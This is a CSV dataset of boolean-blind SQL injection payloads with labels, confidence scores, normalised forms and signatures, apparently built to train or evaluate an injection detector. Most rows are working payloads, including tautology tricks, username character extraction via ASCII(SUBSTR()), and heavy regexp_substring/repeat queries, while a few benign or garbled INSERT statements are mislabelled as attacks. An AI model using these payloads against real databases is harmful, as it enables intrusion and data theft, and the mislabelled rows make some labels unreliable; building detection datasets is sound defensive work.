id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree,payload_norm,wrapper_detected,strip_depth,payload_delex_v2,signature,tier
25307,"1"" ) and make_set ( 4553 = 8132,8132 ) and ( ""pfci"" like ""pfci",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 62 chars.,1,"1"" ) and make_set ( 4553 = 8132,8132 ) and ( ""pfci"" like ""pfci",False,0,1__STR__pfci__STR__pfci,36aff542,silver
795,-1036' ) or 6872 = 6872 and ( 'wvbi' = 'wvbi,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 44 chars.,2,-1036' ) or 6872 = 6872 and ( 'wvbi' = 'wvbi,False,0,-1036__STR__wvbi__STR__wvbi,36d1975b,silver
1990,1 ) and 3659 = 5475 and ( 8949 = 8949,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 37 chars.,2,1 ) and 3659 = 5475 and ( 8949 = 8949,False,0,__INT__ ) and __INT__ = __INT__ and ( __INT__ = __INT__,378982e4,silver
25691,1 ) and 7533 = 7533 and ( 7175 = 7175,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 37 chars.,2,1 ) and 7533 = 7533 and ( 7175 = 7175,False,0,__INT__ ) and __INT__ = __INT__ and ( __INT__ = __INT__,378982e4,silver
6519,"INSERT INTO column ( white, does, certain, curious, first, our ) VALUES ( 'rose', 'anyone'. close', 'remove', 'force', 'feet', 'fell' )",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 135 chars.,2,"INSERT INTO column ( white, does, certain, curious, first, our ) VALUES ( 'rose', 'anyone'. close', 'remove', 'force', 'feet', 'fell' )",False,0,"insert into column ( __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ ) values ( __STR__ , __STR__. __IDENT__' )",37aeca31,silver
22524,"-6629%"" ) ) ) or 8571 = 8571--",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 30 chars.,2,"-6629%"" ) ) ) or 8571 = 8571--",False,0,"-__INT__ % "" ) ) ) or __INT__ = __INT__ --",37d998a3,silver
22935,"-5014%"" ) ) ) or 3348 = 2430--",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 30 chars.,2,"-5014%"" ) ) ) or 3348 = 2430--",False,0,"-__INT__ % "" ) ) ) or __INT__ = __INT__ --",37d998a3,silver
1806,1' ) ) ) and 7533 = 7533 and ( ( ( 'suzd' like 'suzd,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 52 chars.,2,1' ) ) ) and 7533 = 7533 and ( ( ( 'suzd' like 'suzd,False,0,1__STR__suzd__STR__suzd,37fa55c5,silver
22397,"1 ) ) and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null ) and ( ( 9542 = 9542",boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1,"1 ) ) and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null ) and ( ( 9542 = 9542",False,0,"__INT__ ) ) and char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( right ( char ( __INT__ ) , __INT__ ) , __INT__ ) , null ) and ( ( __INT__ = __INT__",38765adc,silver
40509,"' AND ASCII(SUBSTR(username,1,1))>64--",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 38 chars.,1,"' AND ASCII(SUBSTR(username,1,1))>64--",False,0,"' and ascii ( substr ( __IDENT__ , __INT__ , __INT__ ) ) > __INT__ --",38969e08,silver
2515,"1' ) and char ( 109 ) ||char ( 79 ) ||char ( 70 ) ||char ( 90 ) = regexp_substring ( repeat ( right ( char ( 5012 ) ,0 ) ,5000000000 ) ,null ) --",boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1,"1' ) and char ( 109 ) ||char ( 79 ) ||char ( 70 ) ||char ( 90 ) = regexp_substring ( repeat ( right ( char ( 5012 ) ,0 ) ,5000000000 ) ,null ) --",False,0,"__INT__' ) and char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( right ( char ( __INT__ ) , __INT__ ) , __INT__ ) , null ) --",38ed7b2e,silver
23089,-7378' or 6872 = 6872 and 'bnmn' like 'bnmn,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 43 chars.,2,-7378' or 6872 = 6872 and 'bnmn' like 'bnmn,False,0,-7378__STR__bnmn__STR__bnmn,38f4ddb6,silver
22741,"1 ) ) ) and char ( 107 ) ||char ( 121 ) ||char ( 97 ) ||char ( 80 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1,"1 ) ) ) and char ( 107 ) ||char ( 121 ) ||char ( 97 ) ||char ( 80 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",False,0,"__INT__ ) ) ) and char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( left ( __IDENT__ ( char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) , null ) , __INT__ ) , __INT__ ) , null ) --",3921ca56,silver
19392,"1%' or char ( 119 ) ||char ( 100 ) ||char ( 99 ) ||char ( 121 ) = regexp_substring ( repeat ( right ( char ( 1441 ) ,0 ) ,5000000000 ) ,null ) --",boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1,"1%' or char ( 119 ) ||char ( 100 ) ||char ( 99 ) ||char ( 121 ) = regexp_substring ( repeat ( right ( char ( 1441 ) ,0 ) ,5000000000 ) ,null ) --",False,0,"__INT__ % ' or char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( right ( char ( __INT__ ) , __INT__ ) , __INT__ ) , null ) --",39787c1c,silver
24120,"1 or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )",boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1,"1 or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )",False,0,"__INT__ or char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( left ( __IDENT__ ( char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) , null ) , __INT__ ) , __INT__ ) , null )",3998f7d4,silver
2692,"-6681"" ) or 5251 = 1162",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 23 chars.,2,"-6681"" ) or 5251 = 1162",False,0,"-__INT__"" ) or __INT__ = __INT__",3a00676c,silver
19954,"-4543"" ) or 3038 = 3038",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 23 chars.,2,"-4543"" ) or 3038 = 3038",False,0,"-__INT__"" ) or __INT__ = __INT__",3a00676c,silver
20774,"-9265"" ) or 7834 = 1685",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 23 chars.,2,"-9265"" ) or 7834 = 1685",False,0,"-__INT__"" ) or __INT__ = __INT__",3a00676c,silver
21333,"-5630"" ) or 3038 = 3038",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 23 chars.,2,"-5630"" ) or 3038 = 3038",False,0,"-__INT__"" ) or __INT__ = __INT__",3a00676c,silver
22545,"-7939"" ) or 3958 = 6909",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 23 chars.,2,"-7939"" ) or 3958 = 6909",False,0,"-__INT__"" ) or __INT__ = __INT__",3a00676c,silver
22605,"-5761"" ) or 3762 = 1274",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 23 chars.,2,"-5761"" ) or 3762 = 1274",False,0,"-__INT__"" ) or __INT__ = __INT__",3a00676c,silver
18206,"call regexp_substring ( repeat ( right ( char ( 3702 ) ,0 ) ,500000000 ) ,null ) and ( ( ""eevk"" = ""eevk",boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1,"call regexp_substring ( repeat ( right ( char ( 3702 ) ,0 ) ,500000000 ) ,null ) and ( ( ""eevk"" = ""eevk",False,0,"call __IDENT__ ( __IDENT__ ( right ( char ( __INT__ ) , __INT__ ) , __INT__ ) , null ) and ( ( __STR__ = ""__IDENT__",3a42f6df,silver
1267,"-4669"" or 8571 = 8571--",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 23 chars.,2,"-4669"" or 8571 = 8571--",False,0,"-__INT__"" or __INT__ = __INT__ --",3a9ad410,silver
1842,"-7559"" or 8792 = 6905--",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 23 chars.,2,"-7559"" or 8792 = 6905--",False,0,"-__INT__"" or __INT__ = __INT__ --",3a9ad410,silver
2168,"-4054"" or 2824 = 4788--",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 23 chars.,2,"-4054"" or 2824 = 4788--",False,0,"-__INT__"" or __INT__ = __INT__ --",3a9ad410,silver
21227,"-8608"" or 5460 = 4461--",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 23 chars.,2,"-8608"" or 5460 = 4461--",False,0,"-__INT__"" or __INT__ = __INT__ --",3a9ad410,silver
22487,"-8034"" or 8571 = 8571--",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 23 chars.,2,"-8034"" or 8571 = 8571--",False,0,"-__INT__"" or __INT__ = __INT__ --",3a9ad410,silver
24289,"-8709"" or 8571 = 8571--",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 23 chars.,2,"-8709"" or 8571 = 8571--",False,0,"-__INT__"" or __INT__ = __INT__ --",3a9ad410,silver
21392,1 and 7533 = 7533-- spzi,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 24 chars.,2,1 and 7533 = 7533-- spzi,False,0,__INT__ and __INT__ = __INT__ -- __IDENT__,3ad2ade6,silver
23108,1 and 8398 = 1891-- naov,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 24 chars.,2,1 and 8398 = 1891-- naov,False,0,__INT__ and __INT__ = __INT__ -- __IDENT__,3ad2ade6,silver
20128,1 ) ) ) and 9575 = 1640--,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 25 chars.,2,1 ) ) ) and 9575 = 1640--,False,0,__INT__ ) ) ) and __INT__ = __INT__ --,3b2b220f,silver
20965,1 ) ) ) and 9198 = 9198--,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 25 chars.,2,1 ) ) ) and 9198 = 9198--,False,0,__INT__ ) ) ) and __INT__ = __INT__ --,3b2b220f,silver
2436,"1 ) as wvpl where 9791 = 9791 and make_set ( 3491 = 9067,9067 ) --",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 66 chars.,2,"1 ) as wvpl where 9791 = 9791 and make_set ( 3491 = 9067,9067 ) --",False,0,"__INT__ ) as __IDENT__ where __INT__ = __INT__ and __IDENT__ ( __INT__ = __INT__ , __INT__ ) --",3b4c693e,silver
24673,"1 ) as ezje where 5234 = 5234 and make_set ( 8403 = 8403,8899 ) --",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 66 chars.,2,"1 ) as ezje where 5234 = 5234 and make_set ( 8403 = 8403,8899 ) --",False,0,"__INT__ ) as __IDENT__ where __INT__ = __INT__ and __IDENT__ ( __INT__ = __INT__ , __INT__ ) --",3b4c693e,silver
391,1 ) and 4595 = 4595#,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 20 chars.,2,1 ) and 4595 = 4595#,False,0,__INT__ ) and __INT__ = __INT__#,3b9132c4,silver
2244,1 ) and 8417 = 5276#,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 20 chars.,2,1 ) and 8417 = 5276#,False,0,__INT__ ) and __INT__ = __INT__#,3b9132c4,silver
23929,"1 ) where 9469 = 9469 or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1,"1 ) where 9469 = 9469 or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",False,0,"__INT__ ) where __INT__ = __INT__ or char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( left ( __IDENT__ ( char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) , null ) , __INT__ ) , __INT__ ) , null ) --",3b9d7646,silver
25740,"1 ) where 9829 = 9829 or char ( 75 ) ||char ( 70 ) ||char ( 99 ) ||char ( 83 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1,"1 ) where 9829 = 9829 or char ( 75 ) ||char ( 70 ) ||char ( 99 ) ||char ( 83 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",False,0,"__INT__ ) where __INT__ = __INT__ or char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( left ( __IDENT__ ( char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) , null ) , __INT__ ) , __INT__ ) , null ) --",3b9d7646,silver
848,-2307' ) ) ) or 6872 = 6872 and ( ( ( 'fyok' like 'fyok,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 55 chars.,2,-2307' ) ) ) or 6872 = 6872 and ( ( ( 'fyok' like 'fyok,False,0,-2307__STR__fyok__STR__fyok,3bed21d6,silver
24361,"-7125"" or ( 8919 = 2275 ) *2275 and ""fbwo"" = ""fbwo",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 50 chars.,1,"-7125"" or ( 8919 = 2275 ) *2275 and ""fbwo"" = ""fbwo",False,0,-7125__STR__fbwo__STR__fbwo,3c2098de,silver
2095,-1499 ) as gxfm where 9762 = 9762 or 5989 = 4782--,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 50 chars.,2,-1499 ) as gxfm where 9762 = 9762 or 5989 = 4782--,False,0,-__INT__ ) as __IDENT__ where __INT__ = __INT__ or __INT__ = __INT__ --,3c813949,silver
23775,-2658 ) as casi where 7364 = 7364 or 8245 = 9651--,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 50 chars.,2,-2658 ) as casi where 7364 = 7364 or 8245 = 9651--,False,0,-__INT__ ) as __IDENT__ where __INT__ = __INT__ or __INT__ = __INT__ --,3c813949,silver
24657,-6802 ) as coyv where 5693 = 5693 or 8571 = 8571--,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 50 chars.,2,-6802 ) as coyv where 5693 = 5693 or 8571 = 8571--,False,0,-__INT__ ) as __IDENT__ where __INT__ = __INT__ or __INT__ = __INT__ --,3c813949,silver
24669,-9581 ) as jkqo where 5200 = 5200 or 6872 = 6872--,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 50 chars.,2,-9581 ) as jkqo where 5200 = 5200 or 6872 = 6872--,False,0,-__INT__ ) as __IDENT__ where __INT__ = __INT__ or __INT__ = __INT__ --,3c813949,silver
1277,"-8429' ) ) ) or make_set ( 9354 = 9354,7185 ) and ( ( ( 'bwih' like 'bwih",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 73 chars.,1,"-8429' ) ) ) or make_set ( 9354 = 9354,7185 ) and ( ( ( 'bwih' like 'bwih",False,0,-8429__STR__bwih__STR__bwih,3caf8be2,silver
2477,"-2759%"" ) ) or 7769 = 1249#",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 27 chars.,2,"-2759%"" ) ) or 7769 = 1249#",False,0,"-__INT__ % "" ) ) or __INT__ = __INT__#",3cb63d08,silver
19660,"-2284%"" ) ) or 9323 = 9323#",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 27 chars.,2,"-2284%"" ) ) or 9323 = 9323#",False,0,"-__INT__ % "" ) ) or __INT__ = __INT__#",3cb63d08,silver
25577,"call regexp_substring ( repeat ( right ( char ( 3702 ) ,0 ) ,500000000 ) ,null ) and ""rugr"" = ""rugr",boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1,"call regexp_substring ( repeat ( right ( char ( 3702 ) ,0 ) ,500000000 ) ,null ) and ""rugr"" = ""rugr",False,0,"call __IDENT__ ( __IDENT__ ( right ( char ( __INT__ ) , __INT__ ) , __INT__ ) , null ) and __STR__ = ""__IDENT__",3d903750,silver
18115,OR NOT [RANDNUM]=[RANDNUM] OR NOT [INFERENCE],boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 45 chars.,1,OR NOT [RANDNUM]=[RANDNUM] OR NOT [INFERENCE],False,0,or not [__IDENT__] = [__IDENT__] or not [__IDENT__],3dd84c70,silver
32919,"INSERT INTO `wp_options` ( `option_name`, `option_value`, `autoload` ) VALUES ( '_transient_doing_cron', '1630907689.8412559032440185546875', 'yes' ) ON DUPLICATE KEY UPDATE `option_name` = VALUES ( `option_name` ) , `option_value` = VALUES ( `option_value` ) , `autoload` = VALUES ( `autoload` )",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 296 chars.,1,"INSERT INTO `wp_options` ( `option_name`, `option_value`, `autoload` ) VALUES ( '_transient_doing_cron', '1630907689.8412559032440185546875', 'yes' ) ON DUPLICATE KEY UPDATE `option_name` = VALUES ( `option_name` ) , `option_value` = VALUES ( `option_value` ) , `autoload` = VALUES ( `autoload` )",False,0,"insert into `__IDENT__` ( `__IDENT__` , `__IDENT__` , `__IDENT__` ) values ( __STR__ , __STR__ , __STR__ ) on __IDENT__ key update `__IDENT__` = values ( `__IDENT__` ) , `__IDENT__` = values ( `__IDENT__` ) , `__IDENT__` = values ( `__IDENT__` )",3e26ff2f,silver
1148,"1 and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) -- zimf",boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1,"1 and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) -- zimf",False,0,"__INT__ and char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( left ( __IDENT__ ( char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) , null ) , __INT__ ) , __INT__ ) , null ) -- __IDENT__",3e673dcd,silver
19240,"1' and make_set ( 8403 = 8403,8899 ) and 'lnwe' = 'lnwe",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 55 chars.,1,"1' and make_set ( 8403 = 8403,8899 ) and 'lnwe' = 'lnwe",False,0,1__STR__lnwe__STR__lnwe,3ebb1cec,silver
18357,"call regexp_substring ( repeat ( right ( char ( 3702 ) ,0 ) ,500000000 ) ,null ) and ( ( ""weku"" like ""weku",boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1,"call regexp_substring ( repeat ( right ( char ( 3702 ) ,0 ) ,500000000 ) ,null ) and ( ( ""weku"" like ""weku",False,0,"call __IDENT__ ( __IDENT__ ( right ( char ( __INT__ ) , __INT__ ) , __INT__ ) , null ) and ( ( __STR__ like ""__IDENT__",3f1f4447,silver
542,"-3081"" ) ) ) or 3736 = 1899",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 27 chars.,2,"-3081"" ) ) ) or 3736 = 1899",False,0,"-__INT__"" ) ) ) or __INT__ = __INT__",3f4c5530,silver
1254,"-9352"" ) ) ) or 3038 = 3038",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 27 chars.,2,"-9352"" ) ) ) or 3038 = 3038",False,0,"-__INT__"" ) ) ) or __INT__ = __INT__",3f4c5530,silver
2610,"-4639"" ) ) ) or 8550 = 9348",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 27 chars.,2,"-4639"" ) ) ) or 8550 = 9348",False,0,"-__INT__"" ) ) ) or __INT__ = __INT__",3f4c5530,silver
20133,"-6442"" ) ) ) or 3038 = 3038",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 27 chars.,2,"-6442"" ) ) ) or 3038 = 3038",False,0,"-__INT__"" ) ) ) or __INT__ = __INT__",3f4c5530,silver
21849,"-7482"" ) ) ) or 9077 = 2651",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 27 chars.,2,"-7482"" ) ) ) or 9077 = 2651",False,0,"-__INT__"" ) ) ) or __INT__ = __INT__",3f4c5530,silver
24158,"-8966"" ) ) ) or 1628 = 2712",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 27 chars.,2,"-8966"" ) ) ) or 1628 = 2712",False,0,"-__INT__"" ) ) ) or __INT__ = __INT__",3f4c5530,silver
31472,1capa2ad*or,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 11 chars.,1,1capa2ad*or,False,0,1capa2ad * or,3f6cd0f7,silver
21732,"1"" ) and 2954 = 1256--",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 22 chars.,2,"1"" ) and 2954 = 1256--",False,0,"__INT__"" ) and __INT__ = __INT__ --",3fe7e8b6,silver
23806,"1"" ) and 9198 = 9198--",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 22 chars.,2,"1"" ) and 9198 = 9198--",False,0,"__INT__"" ) and __INT__ = __INT__ --",3fe7e8b6,silver
19690,-4538' ) ) ) or 3260 = 1236 and ( ( ( 'hpnd' like 'hpnd,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 55 chars.,2,-4538' ) ) ) or 3260 = 1236 and ( ( ( 'hpnd' like 'hpnd,False,0,-4538__STR__hpnd__STR__hpnd,3ff17b42,silver
1162,-6217 ) ) as hyws where 3441 = 3441 or 9421 = 4695#,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 51 chars.,2,-6217 ) ) as hyws where 3441 = 3441 or 9421 = 4695#,False,0,-__INT__ ) ) as __IDENT__ where __INT__ = __INT__ or __INT__ = __INT__#,3ff91453,silver
2449,-5694 ) ) as cxnb where 6858 = 6858 or 9323 = 9323#,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 51 chars.,2,-5694 ) ) as cxnb where 6858 = 6858 or 9323 = 9323#,False,0,-__INT__ ) ) as __IDENT__ where __INT__ = __INT__ or __INT__ = __INT__#,3ff91453,silver
20371,"1"" ) and char ( 107 ) ||char ( 121 ) ||char ( 97 ) ||char ( 80 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1,"1"" ) and char ( 107 ) ||char ( 121 ) ||char ( 97 ) ||char ( 80 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",False,0,"__INT__"" ) and char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( left ( __IDENT__ ( char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) , null ) , __INT__ ) , __INT__ ) , null ) --",40565e69,silver
